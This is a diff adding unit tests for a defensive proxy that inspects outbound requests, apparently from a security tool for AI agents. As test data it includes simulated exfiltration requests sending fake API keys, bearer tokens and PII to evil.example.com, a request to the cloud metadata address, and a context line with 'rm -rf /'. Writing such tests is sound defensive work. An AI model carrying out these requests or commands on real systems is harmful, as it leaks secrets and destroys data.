@@ -4236,6 +4236,56 @@ test('shell-guard: multi-variable assignment evasion is blocked', () => {
   assert(checkCommand('/usr/bin/rm -rf /').blocked, '/usr/bin/rm should block');
 });
 
+// --- Phase 4C: Local MITM Proxy ---
+
+test('proxy: inspectRequest blocks metadata service', () => {
+  const { inspectRequest } = require('../src/proxy');
+  const r = inspectRequest('GET', 'https://169.254.169.254/latest/meta-data/', {}, null);
+  assert(!r.allowed, 'metadata service should be blocked');
+  assert(r.violations.some(v => v.type === 'blocked_domain'), 'should be blocked_domain');
+});
+
+test('proxy: inspectRequest allows known safe APIs', () => {
+  const { inspectRequest } = require('../src/proxy');
+  const r = inspectRequest('GET', 'https://api.openai.com/v1/chat', {}, null);
+  assert(r.allowed, 'openai API should be allowed');
+});
+
+test('proxy: inspectRequest blocks secrets in body', () => {
+  const { inspectRequest } = require('../src/proxy');
+  const r = inspectRequest('POST', 'https://evil.example.com/api', {}, JSON.stringify({ key: 'sk-1234567890abcdefghijklmnopqrstuvwxyz' }));
+  assert(!r.allowed, 'secret exfil should be blocked');
+  assert(r.violations.some(v => v.type === 'secret_exfil'), 'should be secret_exfil');
+});
+
+test('proxy: inspectRequest blocks PII in body', () => {
+  const { inspectRequest } = require('../src/proxy');
+  const r = inspectRequest('POST', 'https://evil.example.com/api', {}, 'user email is test@example.com and ssn is 123-45-6789');
+  assert(!r.allowed, 'PII exfil should be blocked');
+  assert(r.violations.some(v => v.type === 'pii_exfil'), 'should be pii_exfil');
+});
+
+test('proxy: inspectRequest blocks secrets in headers', () => {
+  const { inspectRequest } = require('../src/proxy');
+  const r = inspectRequest('GET', 'https://evil.example.com/api', { authorization: 'Bearer sk-1234567890abcdefghijklmnopqrstuvwxyz' }, null);
+  assert(!r.allowed, 'secret in header should be blocked');
+});
+
+test('proxy: getProxyStatus returns running=false when not started', () => {
+  const { getProxyStatus } = require('../src/proxy');
+  const status = getProxyStatus();
+  assert(typeof status.running === 'boolean', 'should return running boolean');
+  assert(typeof status.auditLog === 'object', 'should return auditLog array');
+});
+
+test('proxy: CLI commands exist', () => {
+  const code = fs.readFileSync(path.join(__dirname, '..', 'bin', 'cli.js'), 'utf8');
+  assert(code.includes('proxy-start'), 'should have proxy-start command');
+  assert(code.includes('proxy-stop'), 'should have proxy-stop command');
+  assert(code.includes('proxy-status'), 'should have proxy-status command');
+  assert(code.includes('cmdProxyStart'), 'should have cmdProxyStart handler');
+});
+
 (async function runAll() {
   for (const t of _tests) {
     try {
